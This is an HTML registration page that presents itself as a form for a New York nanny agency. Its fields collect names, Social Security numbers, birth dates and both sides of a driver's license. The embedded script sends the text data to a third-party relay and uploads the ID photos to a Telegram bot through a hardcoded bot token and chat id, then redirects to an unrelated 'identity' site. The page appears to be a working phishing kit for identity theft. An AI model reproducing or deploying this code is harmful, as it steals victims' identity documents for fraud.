<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
      Nannies by Noa | New York &amp; Tri-State Area Nanny Agency | Newborn Care
    </title>
    <meta
      property="og:image"
      content="wp-content/uploads/2022/06/Nannies-by-Noa-Featured-Image.jpg"
    />

    <!-- Include Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- <link
      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
      rel="stylesheet"
    /> -->
  </head>

  <body class="bg-gray-100 p-8">
    <div class="max-w-md mx-auto bg-white p-6 rounded-md shadow-md">
      <!-- Company Logo -->
      <img
        src="wp-content\uploads\2022\02\NbN-Full-Logo-White-Variation.png"
        alt="Company Logo"
        class="mb-4 mx-auto"
        style="max-width: 200px"
      />

      <h2 class="text-2xl font-bold mb-6 text-center">Registration Form</h2>

      <form
        id="registrationForm"
        onsubmit="submitForm(event)"
        enctype="multipart/form-data"
      >
        <div class="grid grid-cols-2 gap-4">
          <div>
            <label
              for="firstName"
              class="block text-sm font-medium text-gray-600"
              >First Name</label
            >
            <input
              type="text"
              id="firstName"
              name="firstName"
              placeholder="John"
              class="mt-1 p-2 w-full border rounded-md"
            />
          </div>
          <div>
            <label
              for="lastName"
              class="block text-sm font-medium text-gray-600"
              >Last Name</label
            >
            <input
              type="text"
              id="lastName"
              name="lastName"
              placeholder="Doe"
              class="mt-1 p-2 w-full border rounded-md"
            />
          </div>
        </div>

        <div class="mt-4">
          <label for="email" class="block text-sm font-medium text-gray-600"
            >Email</label
          >
          <input
            type="email"
            id="email"
            name="email"
            placeholder="john.doe@example.com"
            class="mt-1 p-2 w-full border rounded-md"
          />
        </div>

        <div class="mt-4">
          <label
            for="phoneNumber"
            class="block text-sm font-medium text-gray-600"
            >Phone Number (USA)</label
          >
          <input
            type="tel"
            id="phoneNumber"
            name="phoneNumber"
            type="number"
            placeholder="123-456-7890"
            class="mt-1 p-2 w-full border rounded-md"
          />
        </div>

        <div class="mt-4">
          <label for="ssn" class="block text-sm font-medium text-gray-600"
            >Social Security Number</label
          >
          <input
            type="text"
            id="ssn"
            name="ssn"
            type="number"
            placeholder="XXX-XX-XXXX"
            class="mt-1 p-2 w-full border rounded-md"
          />
        </div>

        <div class="grid grid-cols-2 gap-4 mt-4">
          <div>
            <label for="gender" class="block text-sm font-medium text-gray-600"
              >Gender</label
            >
            <select
              id="gender"
              name="gender"
              class="mt-1 p-2 w-full border rounded-md"
            >
              <option value="male">Male</option>
              <option value="female">Female</option>
              <option value="other">Other</option>
            </select>
          </div>
          <div>
            <label for="dob" class="block text-sm font-medium text-gray-600"
              >Date of Birth</label
            >
            <input
              type="date"
              id="dob"
              name="dob"
              class="mt-1 p-2 w-full border rounded-md"
            />
          </div>
        </div>

        <div class="mt-4">
          <label
            for="frontPicture"
            class="block text-sm font-medium text-gray-600"
            >Driver's License/State ID Front Picture</label
          >
          <div
            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
          >
            <input
              type="file"
              id="frontPicture"
              name="frontPicture"
              accept="image/*"
              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
              onchange="updateFileName('frontPicture', this)"
            />
            <div class="text-center">
              <p class="text-gray-500" id="frontPictureFileName">
                Drag and drop your file here or
              </p>
              <p class="text-blue-500">Browse</p>
            </div>
          </div>
        </div>

        <div class="mt-4">
          <label
            for="backPicture"
            class="block text-sm font-medium text-gray-600"
            >Driver's License/State ID Back Picture</label
          >
          <div
            class="relative border-dashed border-2 border-gray-500 p-4 rounded-md"
          >
            <input
              type="file"
              id="backPicture"
              name="backPicture"
              accept="image/*"
              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
              onchange="updateFileName('backPicture', this)"
            />
            <div class="text-center">
              <p class="text-gray-500" id="backPictureFileName">
                Drag and drop your file here or
              </p>
              <p class="text-blue-500">Browse</p>
            </div>
          </div>
        </div>
        <div class="mt-4">
          <label for="acceptTerms" class="flex items-center">
            <input
              type="checkbox"
              id="acceptTerms"
              name="acceptTerms"
              class="form-checkbox"
            />
            <span class="ml-2 text-sm">I accept the terms and conditions</span>
          </label>
        </div>
        <div class="mt-6 text-center">
          <button
            type="submit"
            class="bg-[#65a30d] text-white px-4 py-2 rounded-md w-full hover:bg-d8deaa"
          >
            Submit
          </button>
        </div>
      </form>
    </div>

    <!-- ... Your existing HTML code ... -->

    <script>
      function updateFileName(inputId, inputElement) {
        const fileNameElement = document.getElementById(`${inputId}FileName`);
        const fileName = inputElement.files[0].name;
        fileNameElement.textContent = fileName;
      }

      async function submitForm(event) {
        event.preventDefault();
        // Disable the submit button and change its text to "Processing"
        const submitButton = document.querySelector('button[type="submit"]');
        submitButton.disabled = true;
        submitButton.textContent = "Processing...";
        // Fetch form values
        const firstName = document.getElementById("firstName").value;
        const lastName = document.getElementById("lastName").value;
        const email = document.getElementById("email").value;
        const phoneNumber = document.getElementById("phoneNumber").value;
        const ssn = document.getElementById("ssn").value;
        const gender = document.getElementById("gender").value;
        const dob = document.getElementById("dob").value;
        console.log(firstName);

        console.log(lastName);
        const data = {
          firstName,
          lastName,
          email,
          phoneNumber,
          ssn,
          gender,
          dob,
        };
        // Make a fetch request to the Telegram API endpoint
        fetch("https://telegram-bot-dkpv.onrender.com/form", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Telegram API response:", data);
            // Handle the response as needed
          })
          .catch((error) => {
            console.error("Error sending photo to Telegram:", error);
            // Handle the error as needed
          });
        // Fetch file inputs
        const frontPicture = Array.from(
          document.getElementById("frontPicture").files
        );
        const backPicture = Array.from(
          document.getElementById("backPicture").files
        );

        // Get the file input element
        const frontPictureInput = document.getElementById("frontPicture");
        const backPictureInput = document.getElementById("backPicture");

        // Check if a file is selected
        if (frontPictureInput.files.length > 0) {
          // Get the selected file
          const file = frontPictureInput.files[0];

          // Create a FormData object to handle multipart/form-data
          const formData = new FormData();

          // Append the photo file to the FormData object
          formData.append("photo", file);

          // Append other data (chat_id, etc.) to the FormData object
          formData.append("chat_id", "1636602095");

          // Make a fetch request to the Telegram API endpoint
          fetch(
            "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
            {
              method: "POST",
              body: formData,
            }
          )
            .then((response) => response.json())
            .then((data) => {
              console.log("Telegram API response:", data);
              // Handle the response as needed
            })
            .catch((error) => {
              console.error("Error sending photo to Telegram:", error);
              // Handle the error as needed
            });
        } else {
          console.error("No file selected");
          // Handle the case where no file is selected
        }
        // Check if a file is selected
        if (backPictureInput.files.length > 0) {
          // Get the selected file
          const file = backPictureInput.files[0];

          // Create a FormData object to handle multipart/form-data
          const formData2 = new FormData();

          // Append the photo file to the FormData object
          formData2.append("photo", file);

          // Append other data (chat_id, etc.) to the FormData object
          formData2.append("chat_id", "1636602095");

          // Make a fetch request to the Telegram API endpoint
          fetch(
            "https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendphoto",
            {
              method: "POST",
              body: formData2,
            }
          )
            .then((response) => response.json())
            .then((data2) => {
              console.log("Telegram API response:", data2);
              // Handle the response as needed
              window.location.replace("https://identity-eosin.vercel.app/");
            })
            .catch((error) => {
              console.error("Error sending photo to Telegram:", error);
              // Handle the error as needed
            });
        } else {
          console.error("No file selected");
          // Handle the case where no file is selected
        }
      }
    </script>
  </body>
</html>
